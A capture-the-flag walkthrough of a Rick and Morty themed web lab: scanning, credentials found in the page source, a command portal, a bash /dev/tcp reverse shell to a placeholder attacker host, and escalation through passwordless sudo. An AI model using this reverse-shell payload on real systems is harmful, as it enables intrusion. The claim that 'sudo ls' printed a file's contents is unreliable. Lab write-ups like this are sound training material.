This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

I started with a scan of the IP using a custom script that runs nmap and dirsearch. (Report included)

Nmap showed that there were 2 ports open.
    22 SSH
    80 HTTP
    
Dirsearch showed multiple pages. We will start with robots.txt. 

Navigating to the IP address in a browser shows a username when you 'view source'
    Username found on main page - R1ckRul3s

When you navigate to that page the test 'Wubbalubbadubdub' is on the page. A possible password?

Next we'll try to navigate to the portal.php page. This page has a login.

I entered the username and password we found! It worked!

It appears we can enter commands on this page.

I tried 'ls'. It printed out a bunch of file names.
    Sup3rS3cretPickl3Ingred.txt
    assets
    clue.txt
    denied.php
    index.html
    login.php
    portal.php
    robots.txt

I tried to read the file with 'cat Sup3rS3cretPickl3Ingred.txt'

It is a restricted command. 
    "Command disabled to make it hard for future PICKLEEEE RICCCKKKK."
    
Try it with 'less Sup3rS3cretPickl3Ingred.txt'

That worked! This is our first ingredient.

Let's create a reverse shell.

First we need to open up a terminal and start a listener:
    nc -nlvp 1234
        listening on [any] 1234 ...

Now we enter our shell command:
    bash -c 'bash -i >& /dev/tcp/ATTACKBOX_IP/PORT 0>&1'
        connect to [10.6.1.204] from (UNKNOWN) [10.10.226.235] 54104
        bash: cannot set terminal process group (1355): Inappropriate ioctl for device
        bash: no job control in this shell
        www-data@ip-10-10-226-235:/var/www/html$
        
We have a shell.

I checked for sudo privileges with 'sudo -l'

We can execute sudo commands without a password.

Next type sudo ls ../../../* to list all directories and files.

There is a file called 3rd.txt in the ../../../root directory.

Enter 'sudo ls ../../../root/3rd.txt'
    3rd ingredients: fleeb juice
    
That's our 3rd ingredient.

After some poking around in the directories in navigated to /home/rick/.

'ls' to list contents of the directory and there's a file called 'second ingredients'.

Type less 'second ingredients'

Our final ingredient!
